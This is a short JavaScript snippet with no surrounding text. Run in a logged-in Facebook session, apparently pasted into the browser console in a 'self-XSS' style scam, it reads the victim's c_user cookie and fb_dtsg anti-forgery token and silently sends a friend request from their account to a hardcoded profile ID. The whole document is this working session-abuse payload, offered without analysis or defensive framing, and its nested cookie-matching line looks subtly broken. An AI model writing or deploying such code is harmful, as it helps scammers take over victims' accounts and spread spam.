
var X = new XMLHttpRequest();
var XURL = "//www.facebook.com/ajax/add_friend/action.php?__pc=EXP1%3ADEFAULT";
var XParams = "&to_friend=100004240184193&action=add_friend&how_found=profile_button&ref_param=tl_fr_box&link_data[gt][profile_owner]=100004240184193&link_data[gt][ref]=timeline:timeline&outgoing_id=&logging_location=&no_flyout_on_click=true&ego_log_data&http_referer=https://www.facebook.com/?ref=tn_tnmn&floc=profile_button&frefs[0]=tl_fr_box&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=&confirmed=1";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
